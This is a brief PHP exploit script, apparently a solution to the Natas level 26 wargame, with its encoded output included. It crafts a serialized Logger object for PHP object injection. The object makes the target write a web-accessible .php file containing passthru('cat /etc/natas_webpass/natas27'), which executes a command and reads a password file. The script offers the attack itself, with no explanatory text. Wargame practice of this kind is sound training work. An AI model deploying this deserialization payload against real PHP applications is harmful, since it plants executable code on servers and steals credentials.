<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            $this->initMsg="Start logging\n" ;
            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>\n" ;
            $this->logFile = "/var/www/natas/natas26/img/myLogKali.php";
        }
    }

    $o = new Logger();
    echo urlencode(base64_encode(serialize($o)))."\n";

    /* program outputs:
        Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbXlMb2dLYWxpLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjE0OiJTdGFydCBsb2dnaW5nCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUzOiI8P3BocCBwYXNzdGhydSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8%2BCiI7fQ%3D%3D
    */
?>
